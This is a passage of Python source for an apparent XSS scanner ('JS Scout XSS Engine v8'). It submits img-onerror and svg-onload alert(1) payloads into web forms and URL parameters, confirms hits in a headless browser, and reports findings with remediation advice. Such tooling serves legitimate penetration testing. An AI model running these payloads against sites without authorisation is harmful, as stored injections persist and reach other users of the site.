        (f'<img src=x id="XSSst0r3d9z" onerror=alert(1)>',   'img onerror stored'),
        (f'<svg id="XSSst0r3d9z" onload=alert(1)>',           'svg onload stored'),
        (f'"><img src=x id="XSSst0r3d9z" onerror=alert(1)>',  'attr break stored'),
        (f"'><svg id='XSSst0r3d9z' onload=alert(1)>",         'sq break stored'),
    ]

    def __init__(self, session: requests.Session, browser: 'XSSBrowser' = None,
                 timeout: int = 8, log_fn=None):
        self.session = session
        self.browser = browser
        self.timeout = timeout
        self.log     = log_fn or print

    def probe_form(self, form: dict, check_urls: list = None) -> list:
        findings = []
        if not form.get('fields'):
            return findings

        action = form['action']
        method = form.get('method', 'GET').upper()

        for payload_str, payload_label in self.STORE_PAYLOADS[:2]:
            form_data = {}
            for field in form['fields']:
                ft = field['type']
                if ft in ('text', 'textarea', 'search', 'url', 'tel', ''):
                    form_data[field['name']] = payload_str
                elif ft == 'email':
                    form_data[field['name']] = 'test@evil.com'
                elif ft == 'number':
                    form_data[field['name']] = '1'
                elif ft in ('checkbox', 'radio'):
                    form_data[field['name']] = field.get('value', 'on')
                else:
                    form_data[field['name']] = payload_str

            try:
                if method == 'POST':
                    resp = self.session.post(action, data=form_data,
                                             timeout=self.timeout, allow_redirects=True)
                else:
                    resp = self.session.get(action, params=form_data,
                                            timeout=self.timeout, allow_redirects=True)
            except Exception:
                continue

            pages = list({action, resp.url}.union(set(check_urls or [])))[:6]

            for check_url in pages:
                time.sleep(0.4)
                try:
                    cr = self.session.get(check_url, timeout=self.timeout)
                    if self.MARKER not in cr.text:
                        continue
                except Exception:
                    continue

                browser_confirmed = False
                screenshot        = ''
                if self.browser and self.browser.driver:
                    br = self.browser.test_url(check_url, 'stored', payload_str)
                    browser_confirmed = br['fired']
                    screenshot        = br.get('screenshot', '')

                severity = 'CRITICAL' if browser_confirmed else 'HIGH'
                self.log(f"  [STORED XSS] "
                         f"{'✅ CONFIRMED' if browser_confirmed else '⚠  HTTP-found'}"
                         f"  form={action[:60]}  check={check_url[:60]}")

                findings.append({
                    'type':              'STORED_XSS',
                    'severity':          severity,
                    'confirmed':         browser_confirmed,
                    'url':               check_url,
                    'poc_url':           check_url,
                    'form_action':       action,
                    'form_method':       method,
                    'payload':           payload_str,
                    'payload_label':     payload_label,
                    'browser_confirmed': browser_confirmed,
                    'screenshot':        screenshot,
                    'description':       f'Stored XSS via form at {action}',
                    'remediation':       ('Sanitize stored input before storage '
                                         'AND before rendering. Use DOMPurify.'),
                })
        return findings


# =============================================================================
# MAIN XSS DETECTOR
# =============================================================================

class XSSDetector:
    """Orchestrates reflected, stored, and DOM XSS scanning."""

    def __init__(self, target_url: str,
                 session: requests.Session = None,
                 output_dir: Path = None,
                 timeout: int = 10,
                 threads: int = 4,
                 use_browser: bool = True,
                 log_fn=None):

        if '://' not in target_url:
            target_url = 'https://' + target_url

        self.target_url  = target_url
        self.base_domain = urlparse(target_url).netloc
        self.timeout     = timeout
        self.threads     = min(threads, 4)
        self.log         = log_fn or print
        self.output_dir  = Path(output_dir) if output_dir else Path('xss_output')
        self.shot_dir    = self.output_dir / 'screenshots'

        self.session = session or requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                           'AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36'),
        })

        self.browser_active = False
        self.xss_browser    = None

        if use_browser and SELENIUM_OK:
            self.xss_browser = XSSBrowser(
                timeout        = timeout + 6,
                screenshot_dir = self.shot_dir,
                log_fn         = self.log,
            )

        self.dom_analyzer     = DOMXSSAnalyzer()
        self.reflected_prober = None
        self.stored_prober    = None

        self.findings = {
            'dom_xss':       [],
            'reflected_xss': [],
            'stored_xss':    [],
        }

    def start_browser(self) -> bool:
        if not self.xss_browser:
            if not SELENIUM_OK:
                self.log("[!] Selenium missing: pip install selenium webdriver-manager")
            self.browser_active = False
        else:
            self.browser_active = self.xss_browser.start()
            if not self.browser_active:
                self.log("[!] Chromium failed — HTTP-only fallback")

        browser_inst = self.xss_browser if self.browser_active else None

        self.reflected_prober = ReflectedXSSProber(
            self.session, browser=browser_inst,
            timeout=self.timeout, log_fn=self.log)

        self.stored_prober = StoredXSSProber(
            self.session, browser=browser_inst,
            timeout=self.timeout, log_fn=self.log)

        return self.browser_active

    def stop_browser(self):
        if self.xss_browser:
            self.xss_browser.stop()
        self.browser_active = False

    def analyze_js_files(self, js_files: list):
        if not js_files:
            return
        self.log(f"\n[*] DOM XSS: static analysis of {len(js_files)} JS file(s)")
        total = 0
        for path in js_files:
            try:
                content = Path(path).read_text(encoding='utf-8', errors='replace')
                results = self.dom_analyzer.analyze(content, Path(path).name)
                if results:
                    conf = sum(1 for r in results if r['confirmed_flow'])
                    self.log(f"  [{Path(path).name}] {len(results)} sinks ({conf} src→sink)")
                    self.findings['dom_xss'].extend(results)
                    total += len(results)
            except Exception as e:
                self.log(f"  [!] {path}: {e}")
        self.log(f"  [+] DOM done — {total} sinks")

    def probe_reflected(self, url_param_pairs: list):
        if not url_param_pairs:
            return
        if not self.reflected_prober:
            self.reflected_prober = ReflectedXSSProber(
                self.session, timeout=self.timeout, log_fn=self.log)

        self.log(f"\n[*] Reflected XSS — testing {len(url_param_pairs)} parameter(s)")
        if self.browser_active:
            self.log("    Chromium active — all hits verified by real browser")
        else:
            self.log("    WARNING: HTTP-only mode (no browser confirmation)")

        lock = threading.Lock()
        seen = set()

        def _probe(pair):
            base_url, param = pair
            key = f"{base_url}:{param}"
            with lock:
                if key in seen: return
                seen.add(key)
            parsed   = urlparse(base_url)
            existing = {k: v[0] for k, v in parse_qs(parsed.query).items()}
            clean    = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            results  = self.reflected_prober.probe(clean, param, existing)
            if results:
                with lock:
                    self.findings['reflected_xss'].extend(results)

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futs = {pool.submit(_probe, p): p for p in url_param_pairs}
            cf_wait(futs, timeout=600)
            for f in futs: f.cancel()

        confirmed = sum(1 for f in self.findings['reflected_xss']
                        if f.get('browser_confirmed'))
        self.log(f"  [+] Reflected XSS done — "
                 f"{len(self.findings['reflected_xss'])} findings  "
                 f"({confirmed} browser-confirmed)")

    def probe_stored(self, forms: list, visited_urls: list = None):
        if not forms:
            return
        if not self.stored_prober:
            self.stored_prober = StoredXSSProber(
                self.session, timeout=self.timeout, log_fn=self.log)

        self.log(f"\n[*] Stored XSS — {len(forms)} form(s)")
        check_urls = (visited_urls or [])[:10]
        for form in forms[:20]:
            try:
                results = self.stored_prober.probe_form(form, check_urls)
                if results:
                    self.findings['stored_xss'].extend(results)
            except Exception:
                pass
        self.log(f"  [+] Stored XSS done — {len(self.findings['stored_xss'])} findings")

    # ── Results output ─────────────────────────────────────────────────────────

    def print_results_table(self):
        refl   = self.findings['reflected_xss']
        stored = self.findings['stored_xss']
        dom    = self.findings['dom_xss']
        active = refl + stored
        W      = 82

        print('\n' + '═' * W)
        print('  JS SCOUT  XSS SCAN RESULTS')
        print('═' * W)

        if active:
            confirmed = [f for f in active if f.get('browser_confirmed')]
            unconf    = [f for f in active if not f.get('browser_confirmed')]

            print(f'\n  ⚡  ACTIVE XSS — {len(active)} finding(s)'
                  f'   {len(confirmed)} BROWSER-CONFIRMED'
                  f'   {len(unconf)} HTTP-only\n')

            print(f"  {'#':<4}{'TYPE':<14}{'PARAM':<22}{'CONTEXT':<14}"
                  f"{'CONFIRMED':<13}PAYLOAD")
            print('  ' + '─' * (W - 2))

            for i, f in enumerate(active, 1):
                xtype   = f.get('type','?').replace('_XSS','')[:12]
                param   = str(f.get('param','N/A'))[:20]
                ctx     = f.get('context','?')[:12]
                conf    = '✅ BROWSER' if f.get('browser_confirmed') else '⚠  HTTP'
                payload = f.get('payload','')
                pshort  = (payload[:35] + '…') if len(payload) > 35 else payload
                print(f"  {i:<4}{xtype:<14}{param:<22}{ctx:<14}{conf:<13}{pshort}")

            print()
            for i, f in enumerate(active, 1):
                self._print_card(i, f)

        else:
            print('\n  No active (Reflected / Stored) XSS found.\n')

        conf_dom = [d for d in dom if d.get('confirmed_flow')]
        if conf_dom:
            print(f'\n  DOM XSS — SOURCE→SINK FLOWS  ({len(conf_dom)} confirmed)\n')
            print(f"  {'#':<4}{'SEV':<10}{'SINK':<28}{'FILE':<28}LINE")
            print('  ' + '─' * (W - 2))
            for i, f in enumerate(conf_dom, 1):
                print(f"  {i:<4}{f.get('severity','?')[:8]:<10}"
                      f"{f.get('sink','?')[:26]:<28}"
                      f"{f.get('file','?')[:26]:<28}{f.get('line','?')}")
            print()
            for i, f in enumerate(conf_dom, 1):
                print(f"  [{i}]  {f['sink']}  [{f['severity']}]")
                print(f"       File      : {f['file']}  (line {f['line']})")
                print(f"       Sources   : {', '.join(f.get('sources', []))}")
                print(f"       Code      : {f['context'][:100]}")
                print(f"       Payload   : {f.get('suggested_payload','')}")
                if f.get('sanitizers_nearby'):
                    print(f"       NOTE      : sanitizer nearby — "
                          f"{', '.join(f['sanitizers_nearby'])}")
                print()

        if not active and not conf_dom:
            print('\n  No XSS findings.\n')

        print('═' * W)

    def _print_card(self, n: int, f: dict):
        conf_str = ('✅  BROWSER CONFIRMED' if f.get('browser_confirmed')
                    else '⚠   HTTP-reflected (unconfirmed)')
        sev  = f.get('severity', 'HIGH')
        sep  = '▓' * 64

        tag_detail = ''
        if f.get('context_tag') or f.get('context_attr'):
            tag_detail = (f"  →  tag=<{f.get('context_tag','')}>"
                          f"  attr={f.get('context_attr','')}"
                          f"  quote={f.get('context_quote','')!r}")

        print(f"  [{n}]  {conf_str}  [{sev}]")
        print(f"  {sep}")
        print(f"  Type            : {f.get('type','?')}")
        print(f"  Parameter       : {f.get('param','?')}")
        print(f"  Context         : {f.get('context','?')}{tag_detail}")
        print(f"  Payload         : {f.get('payload','')}")
        print(f"  Payload label   : {f.get('payload_label','')}")
        print(f"  PoC URL         :")
        print(f"    {f.get('poc_url', f.get('url',''))}")
        if f.get('alert_text'):
            print(f"  Alert text      : {f['alert_text']}")
        if f.get('screenshot'):
            print(f"  Screenshot      : {f['screenshot']}")
        if f.get('context_snippet'):
            snip = f['context_snippet'].replace('\n', ' ').strip()[:140]
            print(f"  HTML context    : …{snip}…")
        if f.get('evidence'):
            ev = f['evidence'].replace('\n', ' ').strip()[:160]
            print(f"  Response snippet: {ev}")
        print(f"  Remediation     : {f.get('remediation','')[:150]}")
        print()

    def save_report(self) -> Path:
        self.output_dir.mkdir(parents=True, exist_ok=True)
        out = self.output_dir / 'xss_findings.json'
        out.write_text(json.dumps(self.get_summary(), indent=2, default=str),
                       encoding='utf-8')
        return out

    def get_summary(self) -> dict:
        dom    = self.findings['dom_xss']
        refl   = self.findings['reflected_xss']
        stored = self.findings['stored_xss']
        return {
            'total':               len(dom) + len(refl) + len(stored),
            'dom_xss_count':       len(dom),
            'reflected_xss_count': len(refl),
            'stored_xss_count':    len(stored),
            'critical':            sum(1 for f in refl+stored if f.get('severity') == 'CRITICAL'),
            'high':                sum(1 for f in refl+stored if f.get('severity') == 'HIGH'),
            'dom_confirmed_flows': sum(1 for f in dom   if f.get('confirmed_flow')),
            'browser_confirmed':   sum(1 for f in refl+stored if f.get('browser_confirmed')),
            'findings':            self.findings,
        }


# =============================================================================
# STANDALONE CLI
# =============================================================================

def main():
    ap = argparse.ArgumentParser(
        description='JS Scout XSS Engine v8  — Browser-First Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples
────────
  # Auto-discover params and test all of them
  python3 xss_detector.py https://target.com/search

  # URL already has params — detected + tested automatically
  python3 xss_detector.py "https://target.com/page?q=hello&lang=en"

  # Specify exact params (fast, targeted)
  python3 xss_detector.py https://target.com --params q,search,name,id,comment

  # Authenticated scan with session cookie
  python3 xss_detector.py https://target.com --cookies "session=abc123; csrf=xyz"

  # Scan downloaded JS files for DOM XSS sinks
  python3 xss_detector.py https://target.com --js-dir jsscout_output/target.com/js/

  # HTTP-only mode (no browser, faster but more false positives)
  python3 xss_detector.py https://target.com --no-browser --params q,id

  # Custom header
  python3 xss_detector.py https://target.com --header "Authorization: Bearer TOKEN"
        """
    )
    ap.add_argument('target',       help='Target URL')
    ap.add_argument('--params',     help='Comma-separated params: q,search,id,name')
    ap.add_argument('--js-dir',     help='Directory of JS files for DOM XSS analysis')
    ap.add_argument('--output',     default='xss_output')
    ap.add_argument('--threads',    type=int, default=4)
    ap.add_argument('--timeout',    type=int, default=10)
    ap.add_argument('--no-browser', action='store_true')
    ap.add_argument('--cookies',    help='Cookie string: "name=val; name2=val2"')
    ap.add_argument('--header',     action='append', dest='headers')
    args = ap.parse_args()

    sess = requests.Session()
    sess.verify = False
    if args.cookies:
        for pair in args.cookies.split(';'):
            pair = pair.strip()
            if '=' in pair:
                k, _, v = pair.partition('=')
                sess.cookies.set(k.strip(), v.strip())
    for h in (args.headers or []):
        if ':' in h:
            k, _, v = h.partition(':')
            sess.headers[k.strip()] = v.strip()

    target = args.target
    if '://' not in target:
        target = 'https://' + target

    print()
    print('  ╔════════════════════════════════════════════════════════╗')
    print('  ║   JS Scout  XSS Engine v8   Browser-First Edition     ║')
    print('  ╚════════════════════════════════════════════════════════╝')
    print(f'  Target  : {target}')
    print(f'  Browser : {"Selenium / Chromium (primary engine)" if not args.no_browser else "DISABLED (HTTP-only)"}')
    print()

    detector = XSSDetector(
        target_url  = target,
        session     = sess,
        output_dir  = Path(args.output),
        timeout     = args.timeout,
        threads     = args.threads,
        use_browser = not args.no_browser,
    )

    if not args.no_browser:
        ok = detector.start_browser()
        if not ok:
            print("[!] Chromium failed — continuing in HTTP-only mode\n")

    if args.js_dir:
        js_files = list(Path(args.js_dir).glob('*.js'))
        print(f"[*] Scanning {len(js_files)} JS file(s) for DOM XSS sinks...")
        detector.analyze_js_files([str(f) for f in js_files])

    # Build (url, param) pairs
    parsed = urlparse(target)
    base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    if args.params:
        explicit = [p.strip() for p in args.params.split(',') if p.strip()]
        pairs    = [(base, p) for p in explicit]
        for k in parse_qs(parsed.query).keys():
            if (base, k) not in pairs:
                pairs.insert(0, (base, k))
        print(f"[*] Testing {len(pairs)} explicit parameter(s): "
              f"{', '.join(p for _, p in pairs[:20])}\n")

    else:
        print("[*] Auto-discovering parameters from the page...")
        pairs = []
        try:
            r    = sess.get(target, timeout=args.timeout, allow_redirects=True)
            disc = ParamDiscovery(target)
            disc.feed(r.text)

            for k in parse_qs(parsed.query).keys():
                pairs.append((base, k))
            for url, pset in disc.params.items():
                for p in sorted(pset):
                    if (url, p) not in pairs:
                        pairs.append((url, p))
            for jp in sorted(disc.get_js_params(r.text)):
                if (base, jp) not in pairs:
                    pairs.append((base, jp))

            if pairs:
                unique = sorted(set(p for _, p in pairs))
                print(f"[*] {len(pairs)} parameter(s) found across "
                      f"{len(set(u for u,_ in pairs))} URL(s)")
                print(f"    Params: {', '.join(unique[:40])}\n")

        except Exception as e:
            print(f"[!] Auto-discovery error: {e}")

        if not pairs:
            print("[!] No parameters found automatically.")
            print("    Use: --params q,search,id,name,input,text,msg")
            detector.stop_browser()
            return

    detector.probe_reflected(pairs)
    detector.stop_browser()
    detector.print_results_table()

    out = detector.save_report()
    print(f'\n[*] JSON report: {out}')

    shots = list(detector.shot_dir.glob('*.png')) if detector.shot_dir.exists() else []
    if shots:
        print(f'[*] Screenshots ({len(shots)}): {detector.shot_dir}')

    total     = (len(detector.findings['reflected_xss'])
                 + len(detector.findings['stored_xss']))
    confirmed = sum(1 for f in
                    detector.findings['reflected_xss'] + detector.findings['stored_xss']
                    if f.get('browser_confirmed'))
    print(f'\n[✓] Done — {total} XSS finding(s)  |  {confirmed} browser-confirmed\n')


if __name__ == '__main__':
    main()
